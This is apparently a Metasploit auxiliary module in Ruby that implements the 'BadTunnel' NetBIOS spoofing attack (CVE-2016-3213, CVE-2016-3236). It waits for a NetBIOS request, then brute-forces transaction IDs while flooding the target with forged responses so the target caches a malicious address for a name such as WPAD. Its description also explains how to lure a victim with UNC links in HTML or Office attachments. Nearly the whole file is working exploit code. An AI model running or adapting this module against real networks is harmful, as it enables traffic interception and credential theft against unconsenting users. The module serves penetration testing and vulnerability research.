##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
      'Name'        => 'NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)',
      'Description'    => %q{
          This module listens for a NetBIOS name request and then continuously spams
        NetBIOS responses to a target for given hostname, causing the target to cache
        a malicious address for this name. On high-speed networks, the PPSRATE value
        should be increased to speed up this attack. As an example, a value of around
        30,000 is almost 100% successful when spoofing a response for a 'WPAD' lookup.
        Distant targets may require more time and lower rates for a successful attack.

        This module works when the target is behind a NAT gateway, since the stream of
        NetBIOS responses will keep the NAT mapping alive after the initial setup. To
        trigger the initial NetBIOS request to the Metasploit system, force the target
        to access a UNC link pointing to the same address (HTML, Office attachment, etc).

        This NAT-piercing issue was named the 'BadTunnel' vulnerability by the discoverer,
        Yu Yang (@tombkeeper). The Microsoft patches (MS16-063/MS16-077) impact the way
        that the proxy host (WPAD) host is identified, but do change the predictability
        of NetBIOS requests.

      },
      'Author'     => [
        'vvalien',   # Metasploit Module (post)
        'hdm',       # Metasploit Module
        'tombkeeper' # Vulnerability Discovery
      ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References'     =>
        [
          ['URL', 'http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/'],
          ['CVE', '2016-3213'],
          ['MSB', 'MS16-063'],
          ['CVE', '2016-3236'],
          ['MSB', 'MS16-077']
        ],
      'DisclosureDate' => 'Jun 14 2016'
    )

    register_options(
      [
        OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
        OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 137 ]),
        OptString.new('NBNAME',     [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
        OptAddress.new('NBADDR',    [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
        OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000])
      ])
  end

  def netbios_service
    @port = datastore['SRVPORT'].to_i

    # MacOS X workaround
    ::Socket.do_not_reverse_lookup = true

    @sock = ::UDPSocket.new()
    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    @sock.bind(datastore['SRVHOST'], @port)

    @targ_rate = datastore['PPSRATE']
    @fake_name = datastore['NBNAME']
    @fake_addr = datastore['NBADDR']

    print_status("Listening for NetBIOS requests...")

    begin
      loop do
        packet, addr = @sock.recvfrom(65535)
        next if packet.length == 0

        @targ_addr = addr[3]
        @targ_port = addr[1]
        break
      end

      # TODO: Seed our counter based on the TXID of this request
      print_status("Received a NetBIOS request from #{@targ_addr}:#{@targ_port}")
      @sock.connect(@targ_addr, @targ_port)

      netbios_spam

    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error #{e.class} #{e} #{e.backtrace}")
    ensure
      @sock.close if @sock
    end
  end

  def netbios_spam
    payload =
        "\xff\xff"   + # TX ID (will brute force this)
        "\x85\x00"   + # Flags = response + authoratative + recursion desired
        "\x00\x00"   + # Questions = 0
        "\x00\x01"   + # Answer RRs = 1
        "\x00\x00"   + # Authority RRs = 0
        "\x00\x00"   + # Additional RRs = 0
        "\x20"       +
        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
        "\x00"       +
        "\x00\x20"   + # Type = NB
        "\x00\x01"   + # Class = IN
        "\x00\x04\x93\xe0" + # TTL long time
        "\x00\x06"   + # Datalength = 6
        "\x00\x00"   + # Flags B-node, unique
        Rex::Socket.addr_aton(@fake_addr)

    stime = Time.now.to_f
    pcnt = 0
    pps  = 0

    print_status("Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")

    live = true
    while live
      0.upto(65535) do |txid|
        begin
          payload[0,2] = [txid].pack("n")
          @sock.write(payload)
          pcnt += 1

          pps = (pcnt / (Time.now.to_f - stime)).to_i
          if pps > @targ_rate
            sleep(0.01)
          end
        rescue Errno::ECONNREFUSED
          print_error("Error: Target sent us an ICMP port unreachable, port is likely closed")
          live = false
          break
        end
      end
    end
  end

  def run
    loop { netbios_service }
  end
end
